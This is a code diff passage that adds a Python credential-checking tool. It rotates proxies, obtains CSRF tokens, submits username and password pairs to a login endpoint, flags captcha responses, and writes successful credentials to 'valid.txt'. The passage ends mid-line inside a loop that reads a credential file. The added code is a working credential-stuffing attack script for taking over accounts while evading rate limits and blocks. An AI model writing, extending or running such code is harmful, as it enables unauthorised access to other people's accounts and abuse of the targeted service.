@@ -30,15 +30,70 @@ def load_proxies(proxy_file='proxies.txt'):
 
 def get_proxy_dict(proxy_url):
     if proxy_url.startswith('socks5://') or proxy_url.startswith('socks4://'):
-        return {
-            'http': proxy_url,
-            'https': proxy_url
-        }
+        return {'http': proxy_url, 'https': proxy_url}
     elif proxy_url.startswith('http://') or proxy_url.startswith('https://'):
-        return {
-            'http': proxy_url,
-            'https': proxy_url
-        }
+        return {'http': proxy_url, 'https': proxy_url}
     else:
         # Assume HTTP if no schema
         proxy_url = 'http://' + proxy_url
+        return {'http': proxy_url, 'https': proxy_url}
+
+def try_login(username, password, proxy=None):
+    session = requests.Session()
+    session.headers.update(headers)
+    if proxy:
+        session.proxies.update(proxy)
+
+    # Get CSRF token
+    try:
+        token_req = session.post(login_url, json={}, timeout=15)  # fixed line
+    except Exception as e:
+        print(f"[-] Proxy connection failed: {proxy} | {e}")
+        return False
+
+    if 'x-csrf-token' not in token_req.headers:
+        print("[!] Failed to get CSRF token.")
+        return False
+
+    csrf_token = token_req.headers['x-csrf-token']
+    session.headers['x-csrf-token'] = csrf_token
+
+    payload = {
+        "username": username,
+        "password": password
+    }
+
+    try:
+        login_res = session.post(login_url, json=payload, timeout=15)
+    except Exception as e:
+        print(f"[-] Proxy connection failed on login: {proxy} | {e}")
+        return False
+
+    try:
+        data = login_res.json()
+    except json.JSONDecodeError:
+        print("[-] Non-JSON response. Possible block or proxy failure.")
+        return False
+
+    if "captcha" in login_res.text.lower() or "captchaurl" in login_res.text.lower():
+        handle_captcha()
+        return False
+
+    if login_res.status_code == 200 and 'user' in data:
+        print(f"[+] SUCCESS: {username}:{password}")
+        with open("valid.txt", "a") as f:
+            f.write(f"{username}:{password}\n")
+        return True
+
+    if 'errors' in data:
+        print(f"[-] FAILED: {username}:{password} | Reason: {data['errors'][0]['message']}")
+    else:
+        print(f"[-] FAILED: {username}:{password} | Status: {login_res.status_code}")
+
+    return False
+
+def check_credentials(file_path, proxy_file='proxies.txt'):
+    proxies = load_proxies(proxy_file)
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            for line
